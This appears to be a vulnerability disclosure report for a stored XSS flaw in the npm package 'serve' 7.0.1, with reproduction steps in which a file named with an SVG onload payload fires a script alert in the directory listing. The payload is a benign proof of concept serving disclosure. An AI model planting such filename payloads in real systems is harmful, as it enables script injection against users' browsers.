Summary:

I would like to report a Stored XSS issue in module **serve**
It allows executing malicious javascript code in the user's browser.

# Module

**module name:** serve
**version:** 7.0.1
**npm page:** `https://www.npmjs.com/package/serve`

## Module Description

Assuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.

It behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.

Furthermore, it also provides a neat interface for listing the directory's contents

# Vulnerability

## Steps To Reproduce:

* Install the module

`$ npm i serve`

* Run

`$ ./node_modules/serve/bin/serve.js`

`bash$ touch '"><svg onload=alert(3333333);'`

* In the browser, go to http://127.0.0.1:3000/, the XSS popup will fire.
